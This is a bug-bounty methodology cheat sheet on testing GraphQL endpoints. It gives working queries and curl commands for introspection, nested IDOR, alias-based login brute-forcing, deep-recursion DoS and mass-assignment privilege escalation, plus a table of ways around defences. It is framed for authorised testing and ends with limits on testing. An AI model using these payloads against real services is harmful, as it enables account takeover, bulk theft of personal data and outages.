# GraphQL

> Perspective: black-box, attacks specific to GraphQL endpoints

## 1. One-line Summary

GraphQL = a single endpoint (usually `/graphql`), all query / mutation goes through it.
Specific risks: Introspection exposing the schema, missing field-level authorization, nested queries bypassing permissions, deep recursion DoS.
SRC value: nested IDOR + field-level privilege escalation = P1.

---

## 2. High-frequency Entry Points

```
/graphql       /api/graphql       /v1/graphql
/graphiql      /playground         /api-explorer
/graphql.php   /graphql.json
```

Test whether an endpoint is GraphQL:

```bash
curl -X POST -H "Content-Type: application/json" \
  -d '{"query":"query{__typename}"}' https://target/graphql

→ returns {"data":{"__typename":"Query"}} = it is GraphQL
```

---

## 3. Probing Techniques

### 3.1 Introspection (do this first)

```graphql
query {
  __schema {
    types {
      name
      fields {
        name
        type { name kind ofType { name } }
        args { name type { name } }
      }
    }
    queryType { name }
    mutationType { name }
    subscriptionType { name }
  }
}
```

```bash
# One-line command
curl -X POST -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name fields{name}}}}"}' \
  https://target/graphql | jq

# Tools
graphql-cop https://target/graphql
graphqlmap
clairvoyance (schema inference without introspection)
```

Get the schema → find all sensitive fields (`password`, `ssn`, `creditCard`, `apiKey`, `balance`).

### 3.2 Field-level Privilege Escalation

```graphql
# Top level is a public query
query {
  publicPost(id: 123) {
    title
    author {
      email          # ❌ may have no permission check
      phone
      orders {       # ❌ nested IDOR
        id
        amount
        creditCard
      }
    }
  }
}
```

**Key point**: the top-level interface "looks public", but returns sensitive fields through nesting.

### 3.3 IDOR via id

```graphql
query {
  user(id: 100) {  # change to a different ID
    email
    privateMessages { content }
  }
}
```

### 3.4 Batch Queries / Alias Abuse (rate-limit bypass)

```graphql
query {
  a: login(user:"admin",pass:"a") { token }
  b: login(user:"admin",pass:"b") { token }
  c: login(user:"admin",pass:"c") { token }
  ...
  z: login(user:"admin",pass:"z") { token }
}
# A single request triggers 26 logins
```

Bypasses conventional rate limiting (each HTTP request counts as 1).

### 3.5 Deep Recursion DoS

```graphql
type User {
  friends: [User!]!
}

# Attack query
query {
  user(id:1) {
    friends {
      friends {
        friends {
          friends { ... nested 100 levels ... }
        }
      }
    }
  }
}
```

Observe response time / timeout.

### 3.6 Mutation Mass Assignment

```graphql
mutation {
  updateUser(input: {
    id: 1,
    name: "x",
    isAdmin: true,         # try this
    role: ADMIN
  }) { id name }
}
```

### 3.7 CSRF on GraphQL

```
1. Most GraphQL supports GET (query in the query string)
2. Check whether Content-Type: application/x-www-form-urlencoded is accepted
3. Accepted → CSRF is feasible (a plain form can trigger it)
```

---

## 4. Bypass Matrix

| Block | Bypass |
|---|---|
| Introspection disabled | clairvoyance field inference / grab client code (mobile / web) to find queries |
| Top-level authorization | Nested-field privilege escalation |
| Batch rate limit | Aliases / multiple queries |
| Depth limit | Folding: `...frag` fragment loop expansion |
| ID type validation | Change the GraphQL type: `String` to `Int`, `ID` to `null` |

---

## 5. Exploitation / Privilege Escalation / Lateral Movement

```
Introspection → complete attack-surface map
Nested IDOR → mass PII
Aliases → credential stuffing / SMS bombing
Mutation Mass Assignment → privilege escalation
Depth → DoS
```

---

## 6. Real-case Fingerprints

| Case | One-liner |
|------|------|
| GitHub GraphQL | Nested-field privilege escalation to obtain private repo info |
| Shopify | Alias brute-force login |
| HackerOne itself | Multiple IDOR reports |

General:
- Endpoint returns `{"errors":[{"message":"Cannot query field..."}]}` → GraphQL error messages are useful
- Introspection 200 → immediately pull the schema
- Mutation accepts extra fields → Mass Assignment

---

## 7. Reproduction / Evidence Essentials

### 7.1 PoC

```http
POST /graphql HTTP/1.1
Host: target.com
Content-Type: application/json
Authorization: Bearer A_TOKEN

{"query":"query{user(id:200){email phone}}"}

→ Response:
{"data":{"user":{"email":"b****@****.com","phone":"138****1234"}}}
(B's fields, which A should not be able to read)
```

### 7.2 Introspection

```bash
curl -X POST https://target/graphql \
  -H 'Content-Type: application/json' \
  -d '{"query":"{__schema{types{name fields{name}}}}"}' \
  > schema.json

grep -A 5 -E "(password|ssn|credit|secret|key|token)" schema.json
```

### 7.3 CVSS

```
Introspection exposure               = 5.3 Medium
Nested IDOR PII                       = 6.5–8.1
Alias brute-force                     = 7.5
Mutation Mass Assignment → admin      = 8.8–9.8
Deep recursion DoS                    = 5.3–6.5
```

---

## 8. What Not To Do

- **Forbidden**: using aliases to brute-force real account passwords. Demonstrate on your own test accounts.
- **Forbidden**: using deep recursion DoS to actually take down the service. 10 levels and a few requests are enough to prove it.
- **Forbidden**: dumping large amounts of data via nested IDOR. Samples from 3 different IDs are sufficient.

## H1 Real Cases

_A total of 1 publicly disclosed HackerOne High/Critical report matches this category, sorted by (bounty + votes×100) and taking the Top 12_

| Severity | $ | Program | Title (click for original report) | Summary |
|---|--:|---|---|---|
| Critical | 25000 usd | HackerOne | [Disclosing  PolicyPageAssetGroup in Private Programs via /graphql `gid://hackerone/PolicyPageAsse…](https://hackerone.com/reports/1618347) | Summary:** Hi team, I understand what's going on Description:** Just a recent update gives the results of private programs Step… |
